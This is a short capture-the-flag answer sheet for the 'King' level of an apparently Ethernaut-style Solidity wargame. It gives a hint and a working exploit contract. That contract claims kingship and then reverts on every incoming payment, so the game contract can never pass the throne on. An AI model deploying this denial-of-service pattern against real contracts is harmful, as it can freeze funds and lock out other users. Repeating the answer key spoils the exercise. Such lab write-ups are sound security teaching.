# King

**HINT:** 
```
king.transfer(msg.value);
is called before changing the king
``` 

<details>
<summary>Answer</summary>
<p>

```
pragma solidity ^0.6.4;

contract KillSlayer {
    
    function AllSeeingKing(address addr) public payable {
        (bool result, bytes memory data) = addr.call{value:msg.value}("");
        if(!result) revert("reverted");
    }
    
    fallback() external payable { 
        revert("me king hehe");
    }
}

```
Add the instance address<br></br>
you can check if you are the king now with:
```js
await contract._king()
```
</p>
</details>
